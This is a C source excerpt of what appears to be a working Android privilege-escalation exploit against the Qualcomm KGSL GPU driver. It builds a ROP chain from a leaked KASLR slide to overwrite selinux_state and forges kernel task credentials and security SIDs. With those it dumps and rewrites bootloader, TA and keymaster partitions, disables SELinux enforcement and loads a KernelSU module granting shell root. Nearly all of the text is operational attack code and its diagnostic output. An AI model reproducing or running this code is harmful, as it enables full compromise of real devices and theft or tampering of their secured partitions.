 * The two-gadget chain is:
 *
 *   str w20, [x19]                  -> selinux_state.enforcing = 0
 *   ldp x20, x19, [sp, #0x10]
 *   ldp x29, x30, [sp], #0x20       -> x29 = saved sp, x30 = 0x117228 + slide
 *   ret
 *
 *   0x117228: add sp, x29, #0      -> sp = the saved __switch_to frame
 *             ldp x20, x19, [sp, #0x10]
 *             ldp x29, x30, [sp], #0x20   -> __schedule fp / _text+0x9538854
 *             ret
 *
 * That replays __switch_to's own epilogue, so __schedule calls
 * finish_task_switch() with the untouched x0 (the real previous task) and
 * the child resumes inside futex_wait.  x0 must not be clobbered:
 * finish_task(prev) has to clear prev->on_cpu, otherwise the next
 * try_to_wake_up() spins in smp_cond_load_acquire(&p->on_cpu, !VAL).
 */
static uint32_t sec_lo32(uint64_t value) { return (uint32_t)value; }
static uint32_t sec_hi32(uint64_t value) { return (uint32_t)(value >> 32); }

static uint64_t sec_join64(const uint32_t *words) {
    return ((uint64_t)words[1] << 32) | words[0];
}

/*
 * Build the two-entry chain in the fpsimd vregs and, when trigger is set,
 * replace thread.cpu_context.  Returns the KASLR slide, or 0 when the dry
 * run was requested or the leak failed validation.
 */
static uint64_t sec_perm_arm(
        int fd, unsigned ctx, unsigned ib_id, uint64_t ib_gpu, void *ib_vma,
        unsigned dump_id, uint64_t dump_gpu, void *dump_vma,
        const struct found *root_child, uint64_t task,
        int trigger) {
    if (!g_target->kernel_text_va || !g_target->selinux_state_off ||
        !g_target->task_cpu_context || !g_target->task_fpsimd ||
        !g_target->switch_continuation_off ||
        !g_target->gadget_store_off || !g_target->gadget_switch_return_off)
        return 0;
    if ((task & 0xffff000000000000ULL) != 0xffff000000000000ULL) return 0;

    uint32_t context_words[2 * 13] = {0};
    if (gpu_read_words(fd, ctx, ib_id, ib_gpu, ib_vma, IB_SIZE,
                       dump_id, dump_gpu, dump_vma,
                       root_child->page + g_target->task_cpu_context,
                       context_words, 26) < 0) {
        perror("read thread.cpu_context");
        return 0;
    }
    uint64_t saved_sp = sec_join64(&context_words[22]);
    uint64_t saved_pc = sec_join64(&context_words[24]);

    uint64_t text = g_target->kernel_text_va;
    uint64_t link_continuation = text + g_target->switch_continuation_off;
    if ((saved_pc & 0xffff000000000000ULL) != 0xffff000000000000ULL ||
        saved_pc < link_continuation) {
        fprintf(stderr, "[-] cpu_context.pc=%016llx does not look like the"
                        " __switch_to continuation\n",
                (unsigned long long)saved_pc);
        return 0;
    }
    uint64_t kaslr = saved_pc - link_continuation;
    if ((kaslr & 0x1fffffULL) != 0 || kaslr < 0x1000000000ULL ||
        kaslr >= 0x3000000000ULL) {
        fprintf(stderr, "[-] implausible KASLR slide %016llx\n",
                (unsigned long long)kaslr);
        return 0;
    }
    if ((saved_sp & 0xffff000000000000ULL) != 0xffff000000000000ULL ||
        (saved_sp & 0xfULL) != 0) {
        fprintf(stderr, "[-] implausible kernel stack pointer %016llx\n",
                (unsigned long long)saved_sp);
        return 0;
    }

    uint64_t run_text = text + kaslr;
    uint64_t state = run_text + g_target->selinux_state_off;
    uint64_t store_gadget = run_text + g_target->gadget_store_off;
    uint64_t switch_return = run_text + g_target->gadget_switch_return_off;

    printf("[*] cpu_context pc=%016llx sp=%016llx -> text=%016llx"
           " kaslr=%016llx\n",
           (unsigned long long)saved_pc, (unsigned long long)saved_sp,
           (unsigned long long)run_text, (unsigned long long)kaslr);
    printf("[*] hijack target selinux_state=%016llx word=%08x\n",
           (unsigned long long)state, g_target->selinux_word);
    printf("[*] store gadget=%016llx switch-return=%016llx\n",
           (unsigned long long)store_gadget,
           (unsigned long long)switch_return);

    /*
     * Chain in the fpsimd vregs (task + 0xb70).  Only two gadgets are
     * needed:
     *
     *   gadget 1 (entered from the forged cpu_context):
     *       str w20, [x19]                  x19 = selinux_state
     *       ldp x20, x19, [sp, #0x10]       w20 = 0x01000000
     *       ldp x29, x30, [sp], #0x20       x29 = saved_sp, x30 = gadget 2
     *       ret
     *   gadget 2 (0x117228):
     *       add sp, x29, #0        sp = the saved __switch_to frame
     *       ldp x20, x19, [sp, #0x10]
     *       ldp x29, x30, [sp], #0x20   x29 = __schedule fp, x30 = 0x...8854
     *       ret
     *
     * x0 is never touched, so finish_task_switch() still receives the real
     * previous task and clears its ->on_cpu.
     */
    uint64_t chain_kva = task + g_target->task_fpsimd;
    uint64_t chain[4] = {
        saved_sp,        /* x29; gadget 2 sets sp from it */
        switch_return,   /* x30; replays __switch_to's epilogue */
        0, 0,
    };
    uint32_t chain_words[8];
    for (size_t i = 0; i < 4; i++) {
        chain_words[2 * i] = sec_lo32(chain[i]);
        chain_words[2 * i + 1] = sec_hi32(chain[i]);
    }
    if (gpu_write_words(fd, ctx, ib_id, ib_gpu, ib_vma, IB_SIZE,
                        root_child->page + g_target->task_fpsimd,
                        chain_words, 8) < 0) {
        perror("write hijack chain");
        return 0;
    }

    uint64_t new_context[13] = {0};
    new_context[0] = state;                          /* x19 store address */
    new_context[1] = g_target->selinux_word;         /* x20 store value */
    new_context[11] = chain_kva;                     /* sp */
    new_context[12] = store_gadget;                  /* pc */
    uint32_t forged_words[2 * 13];
    for (int i = 0; i < 13; i++) {
        forged_words[2 * i] = sec_lo32(new_context[i]);
        forged_words[2 * i + 1] = sec_hi32(new_context[i]);
    }

    if (!trigger) {
        printf("[*] SEC_PERM_TRIGGER not set: chain prepared but"
               " cpu_context left untouched\n");
        return 0;
    }

    if (gpu_write_words(fd, ctx, ib_id, ib_gpu, ib_vma, IB_SIZE,
                        root_child->page + g_target->task_cpu_context,
                        forged_words, 26) < 0) {
        perror("forge thread.cpu_context");
        return 0;
    }
    printf("[+] thread.cpu_context armed (sp=%016llx pc=%016llx)\n",
           (unsigned long long)chain_kva, (unsigned long long)store_gadget);
    return kaslr;
}

static int load_module_file(const char *path) {
    const char *params = getenv("INJECT_KO_PARAMS");
    if (!params)
        params = "allow_shell=1";
    return ksu_load_module(path, params);
}

static void setenforce_permissive(void);
static void run_policy_fix(void);

static void child_loop(int idx, pid_t parent_pid, int kgsl_fd) {
    if (prctl(PR_SET_PDEATHSIG, SIGKILL, 0, 0, 0) < 0 ||
        getppid() != parent_pid)
        _exit(127);
    if (kgsl_fd >= 0) close(kgsl_fd);

    char name[16];
    snprintf(name, sizeof(name), "A%07d", getpid());
    if (prctl(PR_SET_NAME, name, 0, 0, 0) < 0) _exit(127);
    __sync_synchronize();
    ctrls[idx].ready = 1;
    if (idx == 0)
        fprintf(stderr, "[*] child identity uid=%u euid=%u gid=%u egid=%u\n",
                (unsigned)getuid(), (unsigned)geteuid(),
                (unsigned)getgid(), (unsigned)getegid());
    while (!ctrls[idx].action && !ctrls[idx].daemon_abort)
        futex_wait_int(&ctrls[idx].action, 0);
    if (ctrls[idx].daemon_abort) _exit(127);

    move_selected_child_for_credential_read();
    if (verify_effective_root(&ctrls[idx].root_stage) < 0)
        ctrls[idx].error = errno ? errno : EPERM;
    if (!ctrls[idx].error) {
        if (prctl(PR_SET_PDEATHSIG, SIGKILL, 0, 0, 0) < 0)
            ctrls[idx].error = errno ? errno : EPERM;
        else if (getppid() != parent_pid)
            ctrls[idx].error = ECHILD;
    }
    ctrls[idx].root_done = 1;
    __sync_synchronize();
    if (ctrls[idx].error) _exit(1);
    if (getenv("SEC_SID")) {
        /* The parent pointed task->security and cred->security at a forged
         * task_security_struct with osid = sid = 1 (kernel). Verify it and
         * keep the patched task alive: selinux_task_free() would otherwise
         * kfree() an interior pointer and take the kernel down. */
        (void)prctl(PR_SET_PDEATHSIG, 0, 0, 0, 0);
        if (g_sec_log) {
            FILE *lf = fmemopen(g_sec_log, SEC_LOG_SIZE, "w");
            if (lf) {
                setvbuf(lf, NULL, _IONBF, 0);
                stdout = lf;
                stderr = lf;
            }
        }
        int cf = open("/proc/self/attr/current", O_RDONLY);
        {
            struct __user_cap_header_struct ch = {_LINUX_CAPABILITY_VERSION_3, 0};
            struct __user_cap_data_struct cd[2] = {{0}};
            if (syscall(SYS_capget, &ch, cd) == 0)
                printf("[cap] eff=%08x%08x perm=%08x%08x bset=%08x%08x\n",
                       cd[1].effective, cd[0].effective, cd[1].permitted,
                       cd[0].permitted, cd[1].inheritable, cd[0].inheritable);
            else
                printf("[cap] capget failed errno=%d\n", errno);
            fflush(NULL);
        }
        if (cf >= 0) {
            char ctx[128] = {0};
            int n = (int)read(cf, ctx, sizeof(ctx) - 1);
            close(cf);
            int of = open("/data/local/tmp/sec_ctx.txt",
                          O_WRONLY | O_CREAT | O_TRUNC, 0644);
            if (of >= 0) {
                if (n > 0) (void)!write(of, ctx, (size_t)n);
                close(of);
            }
        }
        if (getenv("SEC_DUMP")) {
            /* With SID 1 the block devices are readable. Dump the bootloader
             * and the TA/devinfo state, then try to turn enforcing off. */
            static const char *parts[] = {
                "abl_a", "abl_b", "xbl_a", "xbl_b", "devinfo", "frp",
                "TA", "misc", "keymaster_a", "persist", NULL
            };
            static unsigned char buf[1 << 20];
            char line[160];
            int rf = open("/data/local/tmp/sec_dump.txt",
                          O_WRONLY | O_CREAT | O_TRUNC, 0644);
            if (rf >= 0) (void)!write(rf, "start\n", 6);
            for (int pi = 0; parts[pi]; pi++) {
                char src[96], dst[96];
                snprintf(src, sizeof src, "/dev/block/by-name/%s", parts[pi]);
                snprintf(dst, sizeof dst, "/data/local/tmp/dump_%s.img", parts[pi]);
                int in = open(src, O_RDONLY);
                int out = in >= 0 ? open(dst, O_WRONLY | O_CREAT | O_TRUNC, 0644) : -1;
                long long total = -1;
                if (in >= 0 && out >= 0) {
                    total = 0;
                    ssize_t r;
                    while ((r = read(in, buf, sizeof buf)) > 0) {
                        ssize_t off = 0;
                        while (off < r) {
                            ssize_t w = write(out, buf + off, (size_t)(r - off));
                            if (w <= 0) break;
                            off += w;
                        }
                        total += off;
                    }
                }
                if (in >= 0) close(in);
                if (out >= 0) close(out);
                if (rf >= 0) {
                    int n = snprintf(line, sizeof line, "%s %lld\n",
                                     parts[pi], total);
                    if (n > 0) (void)!write(rf, line, (size_t)n);
                }
            }
            int ef = open("/sys/fs/selinux/enforce", O_WRONLY);
            if (ef >= 0) {
                ssize_t w = write(ef, "0", 1);
                if (rf >= 0) {
                    int n = snprintf(line, sizeof line, "enforce_off %zd\n", w);
                    if (n > 0) (void)!write(rf, line, (size_t)n);
                }
                close(ef);
            }
            if (rf >= 0) close(rf);
        }
        const char *sc = getenv("SEC_SETCON");
        if (sc && *sc) {
            int cfd = open("/proc/self/attr/current", O_WRONLY);
            if (cfd >= 0) {
                ssize_t w = write(cfd, sc, strlen(sc));
                int e = errno;
                printf("[setcon] %s write=%zd errno=%d\n", sc, w, w < 0 ? e : 0);
                close(cfd);
            } else {
                printf("[setcon] open errno=%d\n", errno);
            }
            int rfd = open("/proc/self/attr/current", O_RDONLY);
            if (rfd >= 0) {
                char cur[128] = {0};
                ssize_t r = read(rfd, cur, sizeof(cur) - 1);
                close(rfd);
                printf("[setcon] now=%.*s\n", r > 0 ? (int)r : 0, cur);
            }
        }
        if (getenv("SEC_CONTEXT")) {
            int xfd = open("/sys/fs/selinux/context", O_RDWR);
            if (xfd >= 0) {
                ssize_t w = write(xfd, "u:r:vendor_hal_keymaster_qti:s0", 32);
                char rb[256] = {0};
                ssize_t r = read(xfd, rb, sizeof(rb) - 1);
                printf("[context] write=%zd read=%zd [%s]\n", w, r, rb);
                close(xfd);
            } else {
                printf("[context] open errno=%d\n", errno);
            }
        }
        if (getenv("SEC_EXECPROBE")) {
            pid_t ep = fork();
            if (ep == 0) {
                char *nargv[] = {(char *)"true", NULL};
                execve("/system/bin/true", nargv, environ);
                _exit(errno ? errno : 1);
            }
            int est = 0;
            if (ep > 0) {
                waitpid(ep, &est, 0);
                printf("[exec] status=%d exited=%d code=%d\n", est,
                       WIFEXITED(est) ? 1 : 0,
                       WIFEXITED(est) ? WEXITSTATUS(est) : -1);
            }
        }
        if (getenv("SEC_SETEXEC")) {
            int xf = open("/proc/self/attr/exec", O_WRONLY);
            if (xf >= 0) {
                const char *sc2 = getenv("SEC_SETEXEC");
                ssize_t w = write(xf, sc2, strlen(sc2));
                int e = errno;
                printf("[setexec] %s write=%zd errno=%d\n",
                       sc2, w, w < 0 ? e : 0);
                close(xf);
            } else {
                printf("[setexec] open errno=%d\n", errno);
            }
        }
        if (getenv("SEC_PROBE")) {
            static const char *pp[] = {"/dev/ion", "/dev/qseecom",
                "/dev/block/by-name/abl_a", "/vendor/lib64/libQSEEComAPI.so",
                "/data/local/tmp/libQSEEComAPI.so", "/sys/fs/selinux/policy",
                "/sys/fs/selinux/load", NULL};
            for (int i = 0; pp[i]; i++) {
                int fd = open(pp[i], O_RDONLY);
                int e = errno;
                printf("[probe] %s open=%d errno=%d\n", pp[i], fd,
                       fd < 0 ? e : 0);
                if (fd >= 0) close(fd);
            }
            int ef = open("/sys/fs/selinux/enforce", O_WRONLY);
            if (ef >= 0) {
                ssize_t w = write(ef, "0", 1);
                int e = errno;
                printf("[probe] enforce write=%zd errno=%d\n", w, w < 0 ? e : 0);
                close(ef);
            } else {
                printf("[probe] enforce open errno=%d\n", errno);
            }
            fflush(NULL);
        }
        if (getenv("SEC_SIDSCAN")) {
            while (!ctrls[idx].sec_scan_stop) {
                if (!ctrls[idx].sec_probe_ready) {
                    __asm__ volatile("yield" ::: "memory");
                    continue;
                }
                /* Apply the requested SID.  The child holds KERNEL_DS, so it
                 * can patch the forged task_security_struct directly; the
                 * parent's GPU write path is unreliable after the first
                 * submission. */
                if (ctrls[idx].sec_fake_addr) {
                    volatile uint32_t *fake =
                        (volatile uint32_t *)(uintptr_t)ctrls[idx].sec_fake_addr;
                    uint32_t sid = (uint32_t)ctrls[idx].sec_probe_cand;
                    fake[0] = sid;
                    __sync_synchronize();
                    fake[1] = sid;
                    __sync_synchronize();
                }
                static const char *paths[] = {
                    "/dev/sg0", "/dev/block/sda",
                    "/dev/block/by-name/abl_a", "/dev/block/by-name/xbl_a",
                    "/dev/qseecom", "/sys/fs/selinux/load",
                    "/dev/block/sda1", "/dev/block/sda6", "/dev/block/sda40",
                    "/dev/block/sda52", "/dev/binder", NULL};
                static const char *cgpaths[] = {
                    "/sys/fs/cgroup/uid_0/pid_728/cgroup.procs",
                    "/sys/fs/cgroup/uid_0/pid_1/cgroup.procs",
                    "/sys/fs/selinux/load", NULL};
                int mask = 0;
                if (getenv("SEC_CGMOVE")) {
                    for (int pi = 0; cgpaths[pi] && pi < 3; pi++) {
                        int fl = pi < 2 ? O_WRONLY : O_RDONLY;
                        int fd = open(cgpaths[pi], fl);
                        if (fd >= 0) { mask |= 1 << pi; close(fd); }
                    }
                } else {
                    for (int pi = 0; paths[pi] && pi < 12; pi++) {
                        int fd = open(paths[pi], O_RDONLY);
                        if (fd >= 0) {
                            mask |= 1 << pi;
                            ctrls[idx].sec_errno[pi] = 0;
                            close(fd);
                        } else {
                            ctrls[idx].sec_errno[pi] = errno;
                        }
                    }
                }
                /* report the context that the current SID resolves to, so the
                 * parent can map SID numbers onto SELinux domains */
                {
                    int cf = open("/proc/self/attr/current", O_RDONLY);
                    memset(ctrls[idx].sec_ctx, 0, sizeof(ctrls[idx].sec_ctx));
                    if (cf >= 0) {
                        char ctx[sizeof(ctrls[idx].sec_ctx)];
                        int n = (int)read(cf, ctx, sizeof(ctx) - 1);
                        close(cf);
                        if (n > 0) {
                            ctx[n] = 0;
                            memcpy(ctrls[idx].sec_ctx, ctx,
                                   sizeof(ctrls[idx].sec_ctx) - 1);
                        }
                    }
                }
                ctrls[idx].sec_probe_result = mask;
                __sync_synchronize();
                ctrls[idx].sec_probe_ready = 0;
            }
            printf("[scan] stop, final sid applied\n");
            fflush(NULL);
        }
        if (getenv("SEC_CGMOVE")) {
            static const char *cgs[] = {
                "/sys/fs/cgroup/uid_0/pid_728/cgroup.procs",
                "/sys/fs/cgroup/uid_0/pid_1/cgroup.procs", NULL};
            char b[32];
            int n = snprintf(b, sizeof b, "%d\n", getpid());
            for (int i = 0; cgs[i]; i++) {
                int fd = open(cgs[i], O_WRONLY);
                if (fd < 0) {
                    printf("[cg] open %s errno=%d\n", cgs[i], errno);
                    continue;
                }
                ssize_t w = write(fd, b, (size_t)n);
                printf("[cg] move %s w=%zd errno=%d\n", cgs[i], w,
                       w < 0 ? errno : 0);
                close(fd);
            }
            static const char *after[] = {"/dev/block/sda",
                                          "/dev/block/by-name/abl_a",
                                          "/dev/qseecom", NULL};
            for (int i = 0; after[i]; i++) {
                int fd = open(after[i], O_RDONLY);
                printf("[cg] %s=%d errno=%d\n", after[i], fd, fd < 0 ? errno : 0);
                if (fd >= 0) close(fd);
            }
            fflush(NULL);
        }
        if (g_dump_buf && g_dump_hdr) {
            static const char *parts[] = {"abl_a", "xbl_a", "devinfo", "frp",
                                          "TA", "misc", NULL};
            long long off = 0;
            for (int pi = 0; parts[pi] && pi < SEC_DUMP_MAX; pi++) {
                if (off >= (long long)SEC_DUMP_SIZE)
                    break;
                long long total = sec_dump_partition(parts[pi], g_dump_buf + off,
                                                     (long long)SEC_DUMP_SIZE - off);
                if (total <= 0)
                    continue;
                struct sec_dump_hdr *h = g_dump_hdr;
                int slot = h->count;
                if (slot < SEC_DUMP_MAX) {
                    strncpy(h->ent[slot].name, parts[pi], 15);
                    h->ent[slot].name[15] = 0;
                    h->ent[slot].offset = off;
                    h->ent[slot].size = total;
                    __sync_synchronize();
                    h->count = slot + 1;
                }
                off += (total + 0xFFF) & ~0xFFFLL;
            }
            __sync_synchronize();
            g_dump_hdr->done = 1;
        }
        if (getenv("SEC_WRITE") && g_dump_buf && g_dump_hdr) {
            const char *wname = g_dump_hdr->ent[0].name;
            long long len = g_dump_hdr->ent[0].size;
            const char *woff = getenv("SEC_WRITE_OFF");
            long long off = woff ? strtoll(woff, NULL, 0) : 0;
            long long res = (len > 0) ? sec_write_partition(wname, g_dump_buf,
                                                            len, off) : -ENOENT;
            ctrls[idx].sec_errno[0] = (int)res;
            ctrls[idx].sec_errno[1] = (int)len;
            ctrls[idx].sec_errno[2] = (int)off;
            ctrls[idx].sec_errno[3] = 0x5e7e;
            printf("[write] %s off=%lld len=%lld result=%lld\n", wname, off,
                   len, res);
            fflush(NULL);
            __sync_synchronize();
            ctrls[idx].sec_probe_result = 0;
        }
        for (;;) pause();
    }
    if (ctrls[idx].daemon_abort) _exit(127);

    setenforce_permissive();

    if (getenv("INJECT_KO")) {
        const char *ko = getenv("INJECT_KO");
        printf("[*] init_module(%s)\n", ko);
        if (load_module_file(ko) == 0)
            printf("[+] init_module succeeded\n");
        else
            perror("init_module");
        __sync_synchronize();
    }

    /*
     * A late-loaded module has no init-started ksud, so the manager app's
     * ksud children have no driver fd and their SYS_reboot magic is killed
     * by the app seccomp policy.  ksud's own late-load entry point sets the
     * userspace up and restarts the manager with a fresh fd; run it from
     * this full-capability root child.
     */
    const char *late = getenv("LATE_LOAD");
    if (late && *late) {
        const char *pkg = getenv("KSU_PACKAGE");
        if (!pkg || !*pkg)
            pkg = "me.weishu.kernelsu";
        printf("[*] %s late-load --allow-shell --package-name %s\n", late, pkg);
        pid_t lp = fork();
        if (lp == 0) {
            char *argv[] = { (char *)late, (char *)"late-load",
                             (char *)"--allow-shell",
                             (char *)"--package-name", (char *)pkg, NULL };
            execv(late, argv);
            _exit(127);
        }
        if (lp > 0) {
            int lst = 0;
            while (waitpid(lp, &lst, 0) < 0 && errno == EINTR) {}
            if (WIFEXITED(lst))
                printf("[*] late-load exited %d\n", WEXITSTATUS(lst));
        }
    }

    /* Load KSU before the slow policy reload so the manager can detect it
     * immediately; the script itself is backgrounded. */
    run_policy_fix();

    _exit(0);
}

static void spray_children(int kgsl_fd) {
    pid_t parent_pid = getpid();
    for (int i = 0; i < g_child_count; i++) {
        pid_t p = fork();
        if (p == 0) child_loop(i, parent_pid, kgsl_fd);
        if (p < 0) { fprintf(stderr,"[-] fork %d failed: %s\n", i, strerror(errno)); break; }
        ctrls[i].pid = p;
        if ((i + 1) % 256 == 0)
            printf("[*] forked %d/%d children\n", i + 1, g_child_count);
    }
}
static int wait_children_ready(int expected, unsigned timeout_ms) {
    unsigned elapsed = 0;
    while (elapsed < timeout_ms) {
        int ready = 0;
        for (int i = 0; i < g_child_count; i++)
            if (ctrls[i].pid > 0 && ctrls[i].ready) ready++;
        if (ready == expected) {
            printf("[*] named children ready=%d/%d\n", ready, expected);
            return 0;
        }
        usleep(10000);
        elapsed += 10;
    }
    int ready = 0;
    for (int i = 0; i < g_child_count; i++)
        if (ctrls[i].pid > 0 && ctrls[i].ready) ready++;
    fprintf(stderr, "[-] named children ready=%d/%d after %u ms\n",
            ready, expected, timeout_ms);
    errno = ETIMEDOUT;
    return -1;
}
static void kill_children_except(int keep) {
    for (int first = 0; first < g_child_count; first += CLEANUP_BATCH) {
        int end = first + CLEANUP_BATCH;
        if (end > g_child_count) end = g_child_count;
        for (int i = first; i < end; i++) {
            if (i == keep) continue;
            if (ctrls[i].pid > 0) kill(ctrls[i].pid, SIGKILL);
        }
        for (int i = first; i < end; i++) {
            if (i == keep || ctrls[i].pid <= 0) continue;
            while (waitpid(ctrls[i].pid, NULL, 0) < 0 && errno == EINTR) {}
        }
    }
}

static int parse_child_pid(const unsigned char *comm, pid_t *pid_out) {
    if (comm[0] != 'A') return 0;
    unsigned value = 0;
    for (int i = 1; i < 8; i++) {
        if (comm[i] < '0' || comm[i] > '9') return 0;
        value = value * 10 + (unsigned)(comm[i] - '0');
    }
    if (value <= 1) return 0;
    *pid_out = (pid_t)value;
    return 1;
}

struct cred_template {
    uint32_t ids[CRED_IDS_LEN / sizeof(uint32_t)];
    uint32_t cap_sets[10];
    uint32_t securebits;
};

struct cred_alias_candidate {
    uint64_t alias;
    uint32_t ids[CRED_IDS_LEN / sizeof(uint32_t)];
    uint32_t caps[CRED_CAPS_LEN / sizeof(uint32_t)];
};

static uint64_t cred_candidate_anchor;

static int compare_cred_candidates(const void *left, const void *right) {
    const struct cred_alias_candidate *a = left;
    const struct cred_alias_candidate *b = right;
    uint64_t da = a->alias > cred_candidate_anchor ?
                  a->alias - cred_candidate_anchor :
                  cred_candidate_anchor - a->alias;
    uint64_t db = b->alias > cred_candidate_anchor ?
                  b->alias - cred_candidate_anchor :
                  cred_candidate_anchor - b->alias;
    return da < db ? -1 : da > db;
}

static int parse_status_cap(const char *line, uint64_t *value) {
    const char *colon = strchr(line, ':');
    if (!colon) return -1;
    errno = 0;
    char *end = NULL;
    unsigned long long parsed = strtoull(colon + 1, &end, 16);
    if (errno || end == colon + 1) return -1;
    *value = (uint64_t)parsed;
    return 0;
}

static int read_cred_template(struct cred_template *expected) {
    FILE *status = fopen("/proc/self/status", "r");
    if (!status) return -1;

    uint32_t uids[4] = {0}, gids[4] = {0};
    uint64_t cap_values[5] = {0};
    unsigned seen = 0;
    static const char *const cap_names[] = {
        "CapInh:", "CapPrm:", "CapEff:", "CapBnd:", "CapAmb:",
    };
    char line[256];
    while (fgets(line, sizeof(line), status)) {
        if (strncmp(line, "Uid:", 4) == 0) {
            if (sscanf(line + 4, "%u %u %u %u",
                       &uids[0], &uids[1], &uids[2], &uids[3]) == 4)
                seen |= 1U;
        } else if (strncmp(line, "Gid:", 4) == 0) {
            if (sscanf(line + 4, "%u %u %u %u",
                       &gids[0], &gids[1], &gids[2], &gids[3]) == 4)
                seen |= 2U;
        } else {
            for (size_t i = 0; i < sizeof(cap_names) / sizeof(cap_names[0]); i++) {
                if (strncmp(line, cap_names[i], strlen(cap_names[i])) == 0 &&
                    parse_status_cap(line, &cap_values[i]) == 0)
                    seen |= 1U << (i + 2);
            }
        }
    }
    int error = ferror(status) ? EIO : 0;
    fclose(status);
    if (error || seen != 0x7fU) {
        errno = error ? error : EIO;
        return -1;
    }

    expected->ids[0] = uids[0];
    expected->ids[1] = gids[0];
    expected->ids[2] = uids[2];
    expected->ids[3] = gids[2];
    expected->ids[4] = uids[1];
    expected->ids[5] = gids[1];
    expected->ids[6] = uids[3];
    expected->ids[7] = gids[3];
    for (size_t i = 0; i < 5; i++) {
        expected->cap_sets[i * 2] = (uint32_t)cap_values[i];
        expected->cap_sets[i * 2 + 1] = (uint32_t)(cap_values[i] >> 32);
    }
    int securebits = prctl(PR_GET_SECUREBITS, 0, 0, 0, 0);
    if (securebits < 0) return -1;
    expected->securebits = (uint32_t)securebits;
    return 0;
}

static int proc_task_has_root_credentials(pid_t pid, uint32_t cap_last_cap) {
    char path[64];
    int path_length = snprintf(path, sizeof(path), "/proc/%d/status", (int)pid);
    if (path_length < 0 || (size_t)path_length >= sizeof(path)) return 0;
    FILE *status = fopen(path, "r");
    if (!status) {
        if (getenv("KGSL_SCAN_DIAGNOSTICS"))
            fprintf(stderr, "[-] cannot read %s: %s\n", path,
                    strerror(errno));
        return 0;
    }

    uint32_t uids[4] = {0}, gids[4] = {0};
    uint64_t permitted = 0, effective = 0, bounding = 0;
    unsigned seen = 0;
    char line[256];
    while (fgets(line, sizeof(line), status)) {
        if (strncmp(line, "Uid:", 4) == 0) {
            if (sscanf(line + 4, "%u %u %u %u",
                       &uids[0], &uids[1], &uids[2], &uids[3]) == 4)
                seen |= 1U;
        } else if (strncmp(line, "Gid:", 4) == 0) {
            if (sscanf(line + 4, "%u %u %u %u",
                       &gids[0], &gids[1], &gids[2], &gids[3]) == 4)
                seen |= 2U;
        } else if (strncmp(line, "CapPrm:", 7) == 0 &&
                   parse_status_cap(line, &permitted) == 0) {
            seen |= 4U;
        } else if (strncmp(line, "CapEff:", 7) == 0 &&
                   parse_status_cap(line, &effective) == 0) {
            seen |= 8U;
        } else if (strncmp(line, "CapBnd:", 7) == 0 &&
                   parse_status_cap(line, &bounding) == 0) {
            seen |= 16U;
        }
    }
    fclose(status);
    if (seen != 31U) {
        if (getenv("KGSL_SCAN_DIAGNOSTICS"))
            fprintf(stderr, "[-] incomplete %s fields mask=%x\n", path,
                    seen);
        return 0;
    }

    uint32_t high = (1U << (cap_last_cap - 31)) - 1U;
    uint64_t root_caps = UINT32_MAX | ((uint64_t)high << 32);
    for (size_t i = 0; i < 4; i++) {
        if (uids[i] != 0 || gids[i] != 0) {
            if (getenv("KGSL_SCAN_DIAGNOSTICS"))
                fprintf(stderr,
                        "[-] pid=%d IDs uid=%u,%u,%u,%u gid=%u,%u,%u,%u\n",
                        (int)pid, uids[0], uids[1], uids[2], uids[3],
                        gids[0], gids[1], gids[2], gids[3]);
            return 0;
        }
    }
    int caps_match = permitted == root_caps && effective == root_caps &&
                     bounding == root_caps;
    if (!caps_match && getenv("KGSL_SCAN_DIAGNOSTICS"))
        fprintf(stderr,
                "[-] pid=%d caps prm=%016llx eff=%016llx bnd=%016llx expected=%016llx\n",
                (int)pid, (unsigned long long)permitted,
                (unsigned long long)effective, (unsigned long long)bounding,
                (unsigned long long)root_caps);
    return caps_match;
}

static int find_task_candidates(
        int fd, unsigned ctx, unsigned ib_id, uint64_t ib_gpu, void *ib_vma,
        uint64_t ib_bytes, unsigned dump_id, uint64_t dump_gpu, void *dump_vma,
        uint64_t uaf_base, const struct target_profile *profile,
        struct found *candidates, size_t candidate_capacity,
        size_t *candidate_count, int force_full) {
    if (!profile || !candidates || !candidate_capacity || !candidate_count) {
        errno = EINVAL;
        return -1;
    }
    *candidate_count = 0;
    uint64_t pages = UAF_SIZE / PAGE_SIZE;
    if (pages > SCAN_MAX_PAGES) pages = SCAN_MAX_PAGES;
    unsigned char *dump = (unsigned char *)dump_vma;
    uint32_t cand[SCAN_FULL_WORDS];
    uint64_t marker_count = 0;
    uint64_t pid_count = 0;
    uint64_t task_identity_count = 0;
    uint64_t task_identity_mismatch_count = 0;
    uint64_t addr_limit_count = 0;
    uint64_t cred_count = 0;
    uint64_t sampled_values = 0;
    uint64_t nonzero_values = 0;
    size_t diagnostic_samples = 0;
    const char *diagnostics_env = getenv("KGSL_SCAN_DIAGNOSTICS");
    int diagnostics = diagnostics_env && strcmp(diagnostics_env, "1") == 0;
    const char *full_scan_env = getenv("KGSL_SCAN_FULL");
    int full_scan = force_full ||
                    (full_scan_env && strcmp(full_scan_env, "1") == 0);
    size_t words_per_page = full_scan ? SCAN_FULL_WORDS : SCAN_FAST_WORDS;
    size_t pages_per_batch = KM_DUMP_BUFFER_SIZE / (words_per_page * 8);
    if (pages_per_batch > SCAN_MAX_PAGES_PER_BATCH)
        pages_per_batch = SCAN_MAX_PAGES_PER_BATCH;
    printf("[*] task scan mode=%s\n", full_scan ? "full" : "fast");
    for (size_t k = 0; k < words_per_page; k++)
        cand[k] = full_scan ? (uint32_t)k * 8 :
                  ((uint32_t)k * profile->task_stride +
                   profile->task_comm) & 0xfffu;
    for (uint64_t first = SCAN_FIRST_PAGE; first < pages;
         first += pages_per_batch) {
        uint64_t n = pages - first;
        if (n > pages_per_batch) n = pages_per_batch;
        if (n > KM_DUMP_BUFFER_SIZE / (words_per_page * 8)) {
            errno = EOVERFLOW;
            return -1;
        }
        uint32_t *cmd = (uint32_t *)ib_vma;
        int dw = 0;
        cmd[dw++] = pkt(CP_NOP, 0);
        for (uint64_t p = 0; p < n; p++) {
            for (size_t k = 0; k < words_per_page; k++) {
                uint32_t dlo, dhi, slo, shi;
                split64(dump_gpu + (p * words_per_page + k) * 8,
                        &dlo, &dhi);
                split64(uaf_base + ((first + p) * PAGE_SIZE) + cand[k], &slo, &shi);
                cmd[dw++] = pkt(CP_MEM_TO_MEM, 5);
                cmd[dw++] = 0x20000000; /* 8-byte copy */
                cmd[dw++] = dlo; cmd[dw++] = dhi;
                cmd[dw++] = slo; cmd[dw++] = shi;
            }
        }
        cmd[dw++] = pkt(CP_NOP, 0);
        size_t bytes = (size_t)dw * 4;
        if (bytes > ib_bytes) { fprintf(stderr,"[-] IB overflow\n"); return -1; }
